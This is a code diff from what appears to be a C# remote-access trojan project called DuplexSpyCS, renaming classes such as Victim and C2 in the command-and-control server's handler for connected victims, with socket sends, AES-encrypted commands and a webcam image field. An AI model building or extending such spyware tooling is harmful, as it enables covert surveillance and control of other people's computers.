@@ -7,7 +7,7 @@ using System.Net;
 using System.Net.Sockets;
 using DuplexSpyCS;
 
-public class Victim
+public class clsVictim
 {
     //SOCKET
     public Socket socket;
@@ -45,12 +45,12 @@ public class Victim
     //WEBCAM
     public Image img_LastWebcam;
 
-    public Victim(Socket socket)
+    public clsVictim(Socket socket)
     {
         if (socket == null)
         {
             MessageBox.Show("Socket is null.", "class Victim", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            C2.sql_conn.WriteErrorLogs(this, "Null socket");
+            clsStore.sql_conn.WriteErrorLogs(this, "Null socket");
             return;
         }
 
@@ -71,7 +71,7 @@ public class Victim
         {
             try
             {
-                buffer = new DSP((byte)Command, (byte)Param, buffer).GetBytes();
+                buffer = new clsDSP((byte)Command, (byte)Param, buffer).GetBytes();
                 socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                 {
                     try
@@ -80,15 +80,15 @@ public class Victim
                     }
                     catch (Exception ex)
                     {
-                        C2.sql_conn.WriteErrorLogs(this, ex.Message);
+                        clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
                     }
                 }), buffer);
 
-                C2.sent_bytes += buffer.Length;
+                clsStore.sent_bytes += buffer.Length;
             }
             catch (Exception ex)
             {
-                C2.sql_conn.WriteErrorLogs(this, ex.Message);
+                clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
             }
         }
     }
@@ -96,11 +96,11 @@ public class Victim
     {
         new Thread(() =>
         {
-            string enc_data = Crypto.AESEncrypt(data, _AES.key, _AES.iv);
+            string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
             Send(Command, Param, enc_data);
 
             if (Command == 2 && Param != 1)
-                C2.sql_conn.WriteSendLogs(this, $"{data.Split('|')[0]}");
+                clsStore.sql_conn.WriteSendLogs(this, $"{data.Split('|')[0]}");
         }).Start();
     }
     public void SendCommand(string command)
